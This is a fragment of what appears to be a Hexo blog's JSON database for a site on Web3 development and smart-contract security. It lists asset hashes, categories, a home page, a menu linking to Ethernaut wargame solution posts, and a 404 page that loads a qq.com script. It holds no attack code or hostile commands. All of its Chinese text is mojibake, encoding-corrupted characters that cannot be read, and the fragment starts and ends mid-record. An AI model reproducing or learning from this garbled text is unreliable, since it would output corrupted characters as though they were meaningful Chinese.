f7849ec279bf36bb7dbb4c9b9dd7df50b2","modified":1757402344143},{"_id":"public/tags/ç¯å¢ƒæ­å»º/index.html","hash":"f0478c39d41635c0437a6e2a91dae9d63115f5d4","modified":1757402344143},{"_id":"public/tags/Web3å¼€å‘/index.html","hash":"bdd210708b9da5036c94ca5d32c3e3833b06d833","modified":1757402344143},{"_id":"public/tags/æµ‹è¯•æ¡†æ¶/index.html","hash":"10d2169ca772555ac1b40899b4f6500518d52c9d","modified":1757402344143},{"_id":"public/favicon.png","hash":"1214709f0131cc39ee30e0b44ad54fc0a74d3658","modified":1757402344143},{"_id":"public/css/book.css","hash":"d64083b8f2807b534fac100e0a1191a4dd9bb890","modified":1757402344143},{"_id":"public/js/book-post.js","hash":"d239e79163ceb5a37c9274c0c83010eea80554d8","modified":1757402344143},{"_id":"public/js/book-toc.js","hash":"fcbf2a88d9bab50dbd1337150a5909e8b9eecd13","modified":1757402344143},{"_id":"public/js/book-menu.js","hash":"deebd62833f484c84e08357291ccc797c7544eb6","modified":1757402344143},{"_id":"public/js/book.js","hash":"c150427c7397aea35ad83624f8db8f4b19846bb6","modified":1757402344143}],"Category":[{"name":"Dapp","_id":"cmfc7zbou0004bf5qc0c6gicb"},{"name":"Web3å®‰å…¨","_id":"cmfc7zbp0000cbf5qcu6ze2k0"},{"name":"Ethernaut ç³»åˆ—","_id":"cmfc7zbp4000kbf5q8gwx3tju"},{"name":"æ™ºèƒ½åˆçº¦","parent":"cmfc7zbp0000cbf5qcu6ze2k0","_id":"cmfc7zbpc0012bf5q1k9gdz63"},{"name":"åŸºç¡€æ”»å‡»ç¯‡ (1-10)","parent":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpg001abf5qc0vaef9w"},{"name":"è¿›é˜¶æ”»å‡»ç¯‡ (11-20)","parent":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpr002mbf5q8m5c4omq"},{"name":"é«˜çº§æ”»å‡»ç¯‡ (21-25)","parent":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpy0049bf5q3qe2g7dw"},{"name":"Web3å¼€å‘","_id":"cmfc7zbq10050bf5q3o0pf1yw"},{"name":"å·¥å…·é…ç½®","parent":"cmfc7zbq10050bf5q3o0pf1yw","_id":"cmfc7zbq20057bf5q4a5fgdd9"},{"name":"Ethernaut","parent":"cmfc7zbq20057bf5q4a5fgdd9","_id":"cmfc7zbq3005abf5qc137bvzm"}],"Data":[],"Page":[{"title":"é¦–é¡µ","date":"2025-01-24T16:00:00.000Z","_content":"\n# æ¬¢è¿æ¥åˆ° Kent's Blog\n\n> ä¸“æ³¨äº Web3.0 å’ŒåŒºå—é“¾æŠ€æœ¯çš„å¼€å‘è€…\n\n## ğŸ‘‹ å…³äºæˆ‘\n\næˆ‘æ˜¯ Kentï¼Œä¸€åä¸“æ³¨äº **Web3.0** å’Œ **åŒºå—é“¾æŠ€æœ¯** çš„å¼€å‘è€…ã€‚\n\n## ğŸ”¥ æŠ€æœ¯ä¸“é•¿\n\n- **å»ä¸­å¿ƒåŒ–åº”ç”¨ (Dapp) å¼€å‘**\n- **Solidity æ™ºèƒ½åˆçº¦ç¼–ç¨‹**\n- **Rust åŒºå—é“¾å¼€å‘**\n- **åŸºäº Reth SDK çš„è‡ªå®šä¹‰åŒºå—é“¾æ„å»º**\n\n## ğŸ“ åšå®¢å†…å®¹\n\nåœ¨è¿™é‡Œï¼Œæˆ‘ä¼šåˆ†äº«ï¼š\n\n- Web3.0 æŠ€æœ¯æ·±åº¦è§£æ\n- æ™ºèƒ½åˆçº¦å¼€å‘ç»éªŒ\n- åŒºå—é“¾é¡¹ç›®å®æˆ˜\n- Rust ç”Ÿæ€åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨\n- å»ä¸­å¿ƒåŒ–æŠ€æœ¯è¶‹åŠ¿\n\n## ğŸš€ æœ€æ–°æ–‡ç« \n\næ¬¢è¿æµè§ˆæˆ‘çš„ [æœ€æ–°æ–‡ç« ](/archives)ï¼Œäº†è§£æœ€å‰æ²¿çš„åŒºå—é“¾å¼€å‘æŠ€æœ¯ï¼\n\n---\n\n*è®©æˆ‘ä»¬ä¸€èµ·æ¢ç´¢å»ä¸­å¿ƒåŒ–çš„æœªæ¥ï¼*","source":"home.md","raw":"---\ntitle: é¦–é¡µ\ndate: 2025-01-25\n---\n\n# æ¬¢è¿æ¥åˆ° Kent's Blog\n\n> ä¸“æ³¨äº Web3.0 å’ŒåŒºå—é“¾æŠ€æœ¯çš„å¼€å‘è€…\n\n## ğŸ‘‹ å…³äºæˆ‘\n\næˆ‘æ˜¯ Kentï¼Œä¸€åä¸“æ³¨äº **Web3.0** å’Œ **åŒºå—é“¾æŠ€æœ¯** çš„å¼€å‘è€…ã€‚\n\n## ğŸ”¥ æŠ€æœ¯ä¸“é•¿\n\n- **å»ä¸­å¿ƒåŒ–åº”ç”¨ (Dapp) å¼€å‘**\n- **Solidity æ™ºèƒ½åˆçº¦ç¼–ç¨‹**\n- **Rust åŒºå—é“¾å¼€å‘**\n- **åŸºäº Reth SDK çš„è‡ªå®šä¹‰åŒºå—é“¾æ„å»º**\n\n## ğŸ“ åšå®¢å†…å®¹\n\nåœ¨è¿™é‡Œï¼Œæˆ‘ä¼šåˆ†äº«ï¼š\n\n- Web3.0 æŠ€æœ¯æ·±åº¦è§£æ\n- æ™ºèƒ½åˆçº¦å¼€å‘ç»éªŒ\n- åŒºå—é“¾é¡¹ç›®å®æˆ˜\n- Rust ç”Ÿæ€åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨\n- å»ä¸­å¿ƒåŒ–æŠ€æœ¯è¶‹åŠ¿\n\n## ğŸš€ æœ€æ–°æ–‡ç« \n\næ¬¢è¿æµè§ˆæˆ‘çš„ [æœ€æ–°æ–‡ç« ](/archives)ï¼Œäº†è§£æœ€å‰æ²¿çš„åŒºå—é“¾å¼€å‘æŠ€æœ¯ï¼\n\n---\n\n*è®©æˆ‘ä»¬ä¸€èµ·æ¢ç´¢å»ä¸­å¿ƒåŒ–çš„æœªæ¥ï¼*","updated":"2025-09-09T02:23:26.354Z","path":"home.html","comments":1,"layout":"page","_id":"cmfc7zboo0000bf5qauxd3nf9","content":"<h1 id=\"æ¬¢è¿æ¥åˆ°-Kentâ€™s-Blog\"><a href=\"#æ¬¢è¿æ¥åˆ°-Kentâ€™s-Blog\" class=\"headerlink\" title=\"æ¬¢è¿æ¥åˆ° Kentâ€™s Blog\"></a>æ¬¢è¿æ¥åˆ° Kentâ€™s Blog</h1><blockquote>\n<p>ä¸“æ³¨äº Web3.0 å’ŒåŒºå—é“¾æŠ€æœ¯çš„å¼€å‘è€…</p>\n</blockquote>\n<h2 id=\"ğŸ‘‹-å…³äºæˆ‘\"><a href=\"#ğŸ‘‹-å…³äºæˆ‘\" class=\"headerlink\" title=\"ğŸ‘‹ å…³äºæˆ‘\"></a>ğŸ‘‹ å…³äºæˆ‘</h2><p>æˆ‘æ˜¯ Kentï¼Œä¸€åä¸“æ³¨äº <strong>Web3.0</strong> å’Œ <strong>åŒºå—é“¾æŠ€æœ¯</strong> çš„å¼€å‘è€…ã€‚</p>\n<h2 id=\"ğŸ”¥-æŠ€æœ¯ä¸“é•¿\"><a href=\"#ğŸ”¥-æŠ€æœ¯ä¸“é•¿\" class=\"headerlink\" title=\"ğŸ”¥ æŠ€æœ¯ä¸“é•¿\"></a>ğŸ”¥ æŠ€æœ¯ä¸“é•¿</h2><ul>\n<li><strong>å»ä¸­å¿ƒåŒ–åº”ç”¨ (Dapp) å¼€å‘</strong></li>\n<li><strong>Solidity æ™ºèƒ½åˆçº¦ç¼–ç¨‹</strong></li>\n<li><strong>Rust åŒºå—é“¾å¼€å‘</strong></li>\n<li><strong>åŸºäº Reth SDK çš„è‡ªå®šä¹‰åŒºå—é“¾æ„å»º</strong></li>\n</ul>\n<h2 id=\"ğŸ“-åšå®¢å†…å®¹\"><a href=\"#ğŸ“-åšå®¢å†…å®¹\" class=\"headerlink\" title=\"ğŸ“ åšå®¢å†…å®¹\"></a>ğŸ“ åšå®¢å†…å®¹</h2><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä¼šåˆ†äº«ï¼š</p>\n<ul>\n<li>Web3.0 æŠ€æœ¯æ·±åº¦è§£æ</li>\n<li>æ™ºèƒ½åˆçº¦å¼€å‘ç»éªŒ</li>\n<li>åŒºå—é“¾é¡¹ç›®å®æˆ˜</li>\n<li>Rust ç”Ÿæ€åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨</li>\n<li>å»ä¸­å¿ƒåŒ–æŠ€æœ¯è¶‹åŠ¿</li>\n</ul>\n<h2 id=\"ğŸš€-æœ€æ–°æ–‡ç« \"><a href=\"#ğŸš€-æœ€æ–°æ–‡ç« \" class=\"headerlink\" title=\"ğŸš€ æœ€æ–°æ–‡ç« \"></a>ğŸš€ æœ€æ–°æ–‡ç« </h2><p>æ¬¢è¿æµè§ˆæˆ‘çš„ <a href=\"/archives\">æœ€æ–°æ–‡ç« </a>ï¼Œäº†è§£æœ€å‰æ²¿çš„åŒºå—é“¾å¼€å‘æŠ€æœ¯ï¼</p>\n<hr>\n<p><em>è®©æˆ‘ä»¬ä¸€èµ·æ¢ç´¢å»ä¸­å¿ƒåŒ–çš„æœªæ¥ï¼</em></p>\n","excerpt":"","more":"<h1 id=\"æ¬¢è¿æ¥åˆ°-Kentâ€™s-Blog\"><a href=\"#æ¬¢è¿æ¥åˆ°-Kentâ€™s-Blog\" class=\"headerlink\" title=\"æ¬¢è¿æ¥åˆ° Kentâ€™s Blog\"></a>æ¬¢è¿æ¥åˆ° Kentâ€™s Blog</h1><blockquote>\n<p>ä¸“æ³¨äº Web3.0 å’ŒåŒºå—é“¾æŠ€æœ¯çš„å¼€å‘è€…</p>\n</blockquote>\n<h2 id=\"ğŸ‘‹-å…³äºæˆ‘\"><a href=\"#ğŸ‘‹-å…³äºæˆ‘\" class=\"headerlink\" title=\"ğŸ‘‹ å…³äºæˆ‘\"></a>ğŸ‘‹ å…³äºæˆ‘</h2><p>æˆ‘æ˜¯ Kentï¼Œä¸€åä¸“æ³¨äº <strong>Web3.0</strong> å’Œ <strong>åŒºå—é“¾æŠ€æœ¯</strong> çš„å¼€å‘è€…ã€‚</p>\n<h2 id=\"ğŸ”¥-æŠ€æœ¯ä¸“é•¿\"><a href=\"#ğŸ”¥-æŠ€æœ¯ä¸“é•¿\" class=\"headerlink\" title=\"ğŸ”¥ æŠ€æœ¯ä¸“é•¿\"></a>ğŸ”¥ æŠ€æœ¯ä¸“é•¿</h2><ul>\n<li><strong>å»ä¸­å¿ƒåŒ–åº”ç”¨ (Dapp) å¼€å‘</strong></li>\n<li><strong>Solidity æ™ºèƒ½åˆçº¦ç¼–ç¨‹</strong></li>\n<li><strong>Rust åŒºå—é“¾å¼€å‘</strong></li>\n<li><strong>åŸºäº Reth SDK çš„è‡ªå®šä¹‰åŒºå—é“¾æ„å»º</strong></li>\n</ul>\n<h2 id=\"ğŸ“-åšå®¢å†…å®¹\"><a href=\"#ğŸ“-åšå®¢å†…å®¹\" class=\"headerlink\" title=\"ğŸ“ åšå®¢å†…å®¹\"></a>ğŸ“ åšå®¢å†…å®¹</h2><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä¼šåˆ†äº«ï¼š</p>\n<ul>\n<li>Web3.0 æŠ€æœ¯æ·±åº¦è§£æ</li>\n<li>æ™ºèƒ½åˆçº¦å¼€å‘ç»éªŒ</li>\n<li>åŒºå—é“¾é¡¹ç›®å®æˆ˜</li>\n<li>Rust ç”Ÿæ€åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨</li>\n<li>å»ä¸­å¿ƒåŒ–æŠ€æœ¯è¶‹åŠ¿</li>\n</ul>\n<h2 id=\"ğŸš€-æœ€æ–°æ–‡ç« \"><a href=\"#ğŸš€-æœ€æ–°æ–‡ç« \" class=\"headerlink\" title=\"ğŸš€ æœ€æ–°æ–‡ç« \"></a>ğŸš€ æœ€æ–°æ–‡ç« </h2><p>æ¬¢è¿æµè§ˆæˆ‘çš„ <a href=\"/archives\">æœ€æ–°æ–‡ç« </a>ï¼Œäº†è§£æœ€å‰æ²¿çš„åŒºå—é“¾å¼€å‘æŠ€æœ¯ï¼</p>\n<hr>\n<p><em>è®©æˆ‘ä»¬ä¸€èµ·æ¢ç´¢å»ä¸­å¿ƒåŒ–çš„æœªæ¥ï¼</em></p>\n"},{"title":"å¯¼èˆªèœå•","date":"2025-01-24T16:00:00.000Z","_content":"\n## ä¸»è¦å†…å®¹\n\n- [é¦–é¡µ](/)\n- [æ–‡ç« å½’æ¡£](/archives)\n- [åˆ†ç±»æµè§ˆ](/categories) \n- [æ ‡ç­¾äº‘](/tags)\n\n## Web3.0 ä¸“åŒº\n\n- [Dapp å¼€å‘](/categories/Dapp)\n- [æ™ºèƒ½åˆçº¦](/tags/solidity)\n- [åŒºå—é“¾æŠ€æœ¯](/tags/blockchain)\n- [Web3å®‰å…¨](/categories/Web3å®‰å…¨)\n\n## Ethernaut&Foundry ç³»åˆ— ğŸ›¡ï¸\n\n- [ç³»åˆ—æ€»è§ˆ](/2025/01/25/ethernaut-foundry-solutions-series/)\n- [Foundry ç¯å¢ƒæ­å»º](/2025/01/25/foundry-setup-guide/)\n- [Level 1: Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n- [Level 2: Fallout](/2025/01/25/ethernaut-level-02-fallout/)\n- [Level 3: Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)\n- [Level 4: Telephone](/2025/01/25/ethernaut-level-04-telephone/)\n- [Level 5: Token](/2025/01/25/ethernaut-level-05-token/)\n- [Level 6: Delegation](/2025/01/25/ethernaut-level-06-delegation/)\n- [Level 7: Force](/2025/01/25/ethernaut-level-07-force/)\n- [Level 8: Vault](/2025/01/25/ethernaut-level-08-vault/)\n- [Level 9: King](/2025/01/25/ethernaut-level-09-king/)\n- [Level 10: Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)\n- [Level 11: Elevator](/2025/01/25/ethernaut-level-11-elevator/)\n- [Level 12: Privacy](/2025/01/25/ethernaut-level-12-privacy/)\n- [Level 13: Gatekeeper One](/2025/01/25/ethernaut-level-13-gatekeeper-one/)\n- [Level 14: Gatekeeper Two](/2025/01/25/ethernaut-level-14-gatekeeper-two/)\n- [Level 15: Naught Coin](/2025/01/25/ethernaut-level-15-naught-coin/)\n- [Level 16: Preservation](/2025/01/25/ethernaut-level-16-preservation/)\n- [Level 17: Recovery](/2025/01/25/ethernaut-level-17-recovery/)\n- [Level 18: Magic Number](/2025/01/25/ethernaut-level-18-magic-number/)\n- [Level 19: Alien Codex](/2025/01/25/ethernaut-level-19-alien-codex/)\n- [Level 20: Denial](/2025/01/25/ethernaut-level-20-denial/)\n- [Level 21: Shop](/2025/01/25/ethernaut-level-21-shop/)\n- [Level 22: Dex](/2025/01/25/ethernaut-level-22-dex/)\n- [Level 23: Dex Two](/2025/01/25/ethernaut-level-23-dex-two/)\n- [Level 24: Puzzle Wallet](/2025/01/25/ethernaut-level-24-puzzle-wallet/)\n- [Level 25: Motorbike](/2025/01/25/ethernaut-level-25-motorbike/)\n\n## ä¸ªäººé¡µé¢\n\n- [å…³äºæˆ‘](/about)\n- [é¡¹ç›®å±•ç¤º](/repository)\n- [ä¹¦å•æ¨è](/books)\n- [å‹æƒ…é“¾æ¥](/links)","source":"menu.md","raw":"---\ntitle: å¯¼èˆªèœå•\ndate: 2025-01-25\n---\n\n## ä¸»è¦å†…å®¹\n\n- [é¦–é¡µ](/)\n- [æ–‡ç« å½’æ¡£](/archives)\n- [åˆ†ç±»æµè§ˆ](/categories) \n- [æ ‡ç­¾äº‘](/tags)\n\n## Web3.0 ä¸“åŒº\n\n- [Dapp å¼€å‘](/categories/Dapp)\n- [æ™ºèƒ½åˆçº¦](/tags/solidity)\n- [åŒºå—é“¾æŠ€æœ¯](/tags/blockchain)\n- [Web3å®‰å…¨](/categories/Web3å®‰å…¨)\n\n## Ethernaut&Foundry ç³»åˆ— ğŸ›¡ï¸\n\n- [ç³»åˆ—æ€»è§ˆ](/2025/01/25/ethernaut-foundry-solutions-series/)\n- [Foundry ç¯å¢ƒæ­å»º](/2025/01/25/foundry-setup-guide/)\n- [Level 1: Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n- [Level 2: Fallout](/2025/01/25/ethernaut-level-02-fallout/)\n- [Level 3: Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)\n- [Level 4: Telephone](/2025/01/25/ethernaut-level-04-telephone/)\n- [Level 5: Token](/2025/01/25/ethernaut-level-05-token/)\n- [Level 6: Delegation](/2025/01/25/ethernaut-level-06-delegation/)\n- [Level 7: Force](/2025/01/25/ethernaut-level-07-force/)\n- [Level 8: Vault](/2025/01/25/ethernaut-level-08-vault/)\n- [Level 9: King](/2025/01/25/ethernaut-level-09-king/)\n- [Level 10: Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)\n- [Level 11: Elevator](/2025/01/25/ethernaut-level-11-elevator/)\n- [Level 12: Privacy](/2025/01/25/ethernaut-level-12-privacy/)\n- [Level 13: Gatekeeper One](/2025/01/25/ethernaut-level-13-gatekeeper-one/)\n- [Level 14: Gatekeeper Two](/2025/01/25/ethernaut-level-14-gatekeeper-two/)\n- [Level 15: Naught Coin](/2025/01/25/ethernaut-level-15-naught-coin/)\n- [Level 16: Preservation](/2025/01/25/ethernaut-level-16-preservation/)\n- [Level 17: Recovery](/2025/01/25/ethernaut-level-17-recovery/)\n- [Level 18: Magic Number](/2025/01/25/ethernaut-level-18-magic-number/)\n- [Level 19: Alien Codex](/2025/01/25/ethernaut-level-19-alien-codex/)\n- [Level 20: Denial](/2025/01/25/ethernaut-level-20-denial/)\n- [Level 21: Shop](/2025/01/25/ethernaut-level-21-shop/)\n- [Level 22: Dex](/2025/01/25/ethernaut-level-22-dex/)\n- [Level 23: Dex Two](/2025/01/25/ethernaut-level-23-dex-two/)\n- [Level 24: Puzzle Wallet](/2025/01/25/ethernaut-level-24-puzzle-wallet/)\n- [Level 25: Motorbike](/2025/01/25/ethernaut-level-25-motorbike/)\n\n## ä¸ªäººé¡µé¢\n\n- [å…³äºæˆ‘](/about)\n- [é¡¹ç›®å±•ç¤º](/repository)\n- [ä¹¦å•æ¨è](/books)\n- [å‹æƒ…é“¾æ¥](/links)","updated":"2025-09-09T07:09:50.286Z","path":"menu.html","comments":1,"layout":"page","_id":"cmfc7zbos0002bf5q0j84bpo5","content":"<h2 id=\"ä¸»è¦å†…å®¹\"><a href=\"#ä¸»è¦å†…å®¹\" class=\"headerlink\" title=\"ä¸»è¦å†…å®¹\"></a>ä¸»è¦å†…å®¹</h2><ul>\n<li><a href=\"/\">é¦–é¡µ</a></li>\n<li><a href=\"/archives\">æ–‡ç« å½’æ¡£</a></li>\n<li><a href=\"/categories\">åˆ†ç±»æµè§ˆ</a> </li>\n<li><a href=\"/tags\">æ ‡ç­¾äº‘</a></li>\n</ul>\n<h2 id=\"Web3-0-ä¸“åŒº\"><a href=\"#Web3-0-ä¸“åŒº\" class=\"headerlink\" title=\"Web3.0 ä¸“åŒº\"></a>Web3.0 ä¸“åŒº</h2><ul>\n<li><a href=\"/categories/Dapp\">Dapp å¼€å‘</a></li>\n<li><a href=\"/tags/solidity\">æ™ºèƒ½åˆçº¦</a></li>\n<li><a href=\"/tags/blockchain\">åŒºå—é“¾æŠ€æœ¯</a></li>\n<li><a href=\"/categories/Web3%E5%AE%89%E5%85%A8\">Web3å®‰å…¨</a></li>\n</ul>\n<h2 id=\"Ethernaut-Foundry-ç³»åˆ—-ğŸ›¡ï¸\"><a href=\"#Ethernaut-Foundry-ç³»åˆ—-ğŸ›¡ï¸\" class=\"headerlink\" title=\"Ethernaut&amp;Foundry ç³»åˆ— ğŸ›¡ï¸\"></a>Ethernaut&amp;Foundry ç³»åˆ— ğŸ›¡ï¸</h2><ul>\n<li><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—æ€»è§ˆ</a></li>\n<li><a href=\"/2025/01/25/foundry-setup-guide/\">Foundry ç¯å¢ƒæ­å»º</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-15-naught-coin/\">Level 15: Naught Coin</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-18-magic-number/\">Level 18: Magic Number</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-19-alien-codex/\">Level 19: Alien Codex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-23-dex-two/\">Level 23: Dex Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-24-puzzle-wallet/\">Level 24: Puzzle Wallet</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike</a></li>\n</ul>\n<h2 id=\"ä¸ªäººé¡µé¢\"><a href=\"#ä¸ªäººé¡µé¢\" class=\"headerlink\" title=\"ä¸ªäººé¡µé¢\"></a>ä¸ªäººé¡µé¢</h2><ul>\n<li><a href=\"/about\">å…³äºæˆ‘</a></li>\n<li><a href=\"/repository\">é¡¹ç›®å±•ç¤º</a></li>\n<li><a href=\"/books\">ä¹¦å•æ¨è</a></li>\n<li><a href=\"/links\">å‹æƒ…é“¾æ¥</a></li>\n</ul>\n","excerpt":"","more":"<h2 id=\"ä¸»è¦å†…å®¹\"><a href=\"#ä¸»è¦å†…å®¹\" class=\"headerlink\" title=\"ä¸»è¦å†…å®¹\"></a>ä¸»è¦å†…å®¹</h2><ul>\n<li><a href=\"/\">é¦–é¡µ</a></li>\n<li><a href=\"/archives\">æ–‡ç« å½’æ¡£</a></li>\n<li><a href=\"/categories\">åˆ†ç±»æµè§ˆ</a> </li>\n<li><a href=\"/tags\">æ ‡ç­¾äº‘</a></li>\n</ul>\n<h2 id=\"Web3-0-ä¸“åŒº\"><a href=\"#Web3-0-ä¸“åŒº\" class=\"headerlink\" title=\"Web3.0 ä¸“åŒº\"></a>Web3.0 ä¸“åŒº</h2><ul>\n<li><a href=\"/categories/Dapp\">Dapp å¼€å‘</a></li>\n<li><a href=\"/tags/solidity\">æ™ºèƒ½åˆçº¦</a></li>\n<li><a href=\"/tags/blockchain\">åŒºå—é“¾æŠ€æœ¯</a></li>\n<li><a href=\"/categories/Web3%E5%AE%89%E5%85%A8\">Web3å®‰å…¨</a></li>\n</ul>\n<h2 id=\"Ethernaut-Foundry-ç³»åˆ—-ğŸ›¡ï¸\"><a href=\"#Ethernaut-Foundry-ç³»åˆ—-ğŸ›¡ï¸\" class=\"headerlink\" title=\"Ethernaut&amp;Foundry ç³»åˆ— ğŸ›¡ï¸\"></a>Ethernaut&amp;Foundry ç³»åˆ— ğŸ›¡ï¸</h2><ul>\n<li><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—æ€»è§ˆ</a></li>\n<li><a href=\"/2025/01/25/foundry-setup-guide/\">Foundry ç¯å¢ƒæ­å»º</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-15-naught-coin/\">Level 15: Naught Coin</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-18-magic-number/\">Level 18: Magic Number</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-19-alien-codex/\">Level 19: Alien Codex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-23-dex-two/\">Level 23: Dex Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-24-puzzle-wallet/\">Level 24: Puzzle Wallet</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike</a></li>\n</ul>\n<h2 id=\"ä¸ªäººé¡µé¢\"><a href=\"#ä¸ªäººé¡µé¢\" class=\"headerlink\" title=\"ä¸ªäººé¡µé¢\"></a>ä¸ªäººé¡µé¢</h2><ul>\n<li><a href=\"/about\">å…³äºæˆ‘</a></li>\n<li><a href=\"/repository\">é¡¹ç›®å±•ç¤º</a></li>\n<li><a href=\"/books\">ä¹¦å•æ¨è</a></li>\n<li><a href=\"/links\">å‹æƒ…é“¾æ¥</a></li>\n</ul>\n"},{"title":"å…³äº","description":"ä¸ªäººç®€ä»‹","layout":"about","comments":0,"sidebar":"custom","_content":"ä¸ªäººè¯¦ç»†ä»‹ç»","source":"about/index.md","raw":"---\ntitle: å…³äº\ndescription: ä¸ªäººç®€ä»‹\nlayout: about\ncomments: false\nsidebar: custom\n---\nä¸ªäººè¯¦ç»†ä»‹ç»","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"about/index.html","_id":"cmfc7zbow0006bf5qctjog2gq","content":"<p>ä¸ªäººè¯¦ç»†ä»‹ç»</p>\n","excerpt":"","more":"<p>ä¸ªäººè¯¦ç»†ä»‹ç»</p>\n"},{"title":"404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º","toc":false,"comments":0,"_content":"<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"å›åˆ°æˆ‘çš„ä¸»é¡µ\"></script>\n","source":"404/index.md","raw":"---\ntitle: 404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º\ntoc: false\ncomments: false\npermalink: /404\n---\n<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"å›åˆ°æˆ‘çš„ä¸»é¡µ\"></script>\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"/404.html","layout":"page","_id":"cmfc7zboy0008bf5qcx38hvxl","content":"<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"å›åˆ°æˆ‘çš„ä¸»é¡µ\"></script>\n","excerpt":"","more":"<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" 